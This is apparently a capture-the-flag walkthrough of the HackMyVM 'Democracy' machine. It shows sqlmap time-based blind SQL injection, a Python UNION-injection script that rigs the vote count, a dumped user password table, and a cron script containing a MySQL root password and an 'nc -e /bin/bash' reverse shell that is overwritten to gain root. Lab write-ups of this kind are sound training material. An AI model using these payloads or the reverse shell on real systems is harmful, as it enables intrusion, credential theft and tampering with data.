# Democracy

## Recon

::: details nmap_scan.log.md
```log
Open ports, closed hearts.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.162:80
Open 10.0.2.162:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.162
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Vote for Your Candidate
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/democracy/writeup.png)

Voting requires registration/login.

`voted=1` cookie doesn't seem to control whether you voted or not, it's just 1 and changing it doesn't do anything. 

![writeup-1.png](/assets/pentest/hackmyvm/democracy/writeup-1.png)

Your vote depends on the session cookie.

After some fuzzing the `candidate` I noticed that anything returned OK result, even if error should have been raised it was just OK so I decided to test injection with sqlmap. Save both requests, first to vote and second to reset vote.

```bash
└─$ sqlmap -r req1.txt --batch --second-req req2.txt --dbms=MySQL --current-db --level 5 --risk 3
---
Parameter: candidate (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: candidate=democrat' AND (SELECT 3276 FROM (SELECT(SLEEP(5)))xbEG) AND 'HpJg'='HpJg
---
current database: 'voting'
```

Show tables
```bash
└─$ sqlmap -r req1.txt --batch --second-req req2.txt --dbms=MySQL -D voting --tables
Database: voting
[2 tables]
+-------+
| users |
| votes |
+-------+
```

Dump users
```bash
└─$ sqlmap -r req1.txt --batch --second-req req2.txt --dbms=MySQL -D voting -T users --dump
+----+-----------+------------+
| id | password  | username   |
+----+-----------+------------+
| 1  | azerty    | paolo      |
| 2  | sturgeon  | rank       |
| 3  | 2531      | bob        |
| 4  | 170987    | aubrey     |
| 5  | sesese    | farah      |
| 6  | corps4    | dorian     |
| 7  | 150468    | nyla       |
| 8  | killall   | cai        |
| 9  | 0raziel0  | corny      |
| 10 | 280593    | vidya      |
| 11 | juiced    | gerhardine |
| 12 | 02011988  | gloriana   |
| 13 | 14011957  | lexi       |
| 14 | 131264    | budi       |
| 15 | 020183    | carmelina  |
| 16 | magnit    | wilford    |
| 17 | 8778      | payroll    |
| 18 | 272829    | patrica    |
| 19 | alexandro | federica   |
| 20 | 2487      | becka      |
| 21 | calif     | aleen      |
| 22 | 09061989  | anneliese  |
| 23 | servic    | dieter     |
| 24 | Spider    | margalit   |
| 25 | down      | mirella    |
| 26 | vinny1    | debora     |
...
```

This was taking very long, the users didn't seem to anything special too so I stopped.

Considering the type of CTF we might actually have to win the election...

Following query shows 2 votes instead of 1
```
view_results=1&candidate=democrat') UNION SELECT 1,"democrat" -- -
```

![writeup-2.png](/assets/pentest/hackmyvm/democracy/writeup-2.png)

```python
import requests

URL = "http://10.0.2.162/vote.php"
COOKIE = {"PHPSESSID": "v3d93vkmgecqe6jgai1ld9t8lu"}

# Reset vote
requests.post(URL, cookies=COOKIE, data={"reset": "1"})

# Win
payload = " ".join([f"UNION SELECT {i},'democrat'" for i in range(1, 1002)])
resp = requests.post(
    URL, cookies=COOKIE,
    data={"view_results": "1", "candidate": f"democrat') {payload} -- -"},
)
print(resp.text)
```

Output
```html
          <p>Democrat: 1002 votes</p>
        <p>Republican: 0 votes</p>

	        <img src="/images/john.gif" alt="Loading..." style="position: fixed; top: 0; bottom: 0; left: 0; right: 0; margin: auto;" />
        <script>
        setTimeout(function(){
        window.location.href = 'systemopening.php';
        }, 2000);
        </script>
```

Something opening and then Done?

![writeup-3.png](/assets/pentest/hackmyvm/democracy/writeup-3.png)

```bash
└─$ nscan 10.0.2.162
Open 10.0.2.162:80
Open 10.0.2.162:21
Open 10.0.2.162:22
```

## FTP

FTP opened after winning election....

We are able to download and upload as anonymous user
```bash
└─$ ftp anonymous@10.0.2.162
Connected to 10.0.2.162.
220 ProFTPD Server (Debian) [::ffff:10.0.2.162]
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
ftp> ls
-rwxrwxrwx   1 root     root          258 Apr 30  2023 votes
ftp> get votes
226 Transfer complete
ftp> put shell.php
226 Transfer complete
ftp> exit
221 Goodbye.
```

```bash
└─$ cat votes
#! /bin/bash
## this script runs every minute ##
#!/bin/bash
mysql -u root -pYklX69Vfa voting << EOF
SELECT COUNT(*) FROM votes WHERE candidate='republican';
SELECT COUNT(*) FROM votes WHERE candidate='democrat';
EOF

nc -e /bin/bash 192.168.0.29 4444
```

Download file, edit file (change IP), upload (overwrite original script), wait

```bash
└─$ penelope -p 4444
root@democracy:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flags

```
root@democracy:~# cat /home/trump/user.txt
399dba2fcf50acb2110f5e44380d20e4
root@democracy:~# cat /root/root.txt
081c1bc3fe537326ad7bcb8e571b1f5h
```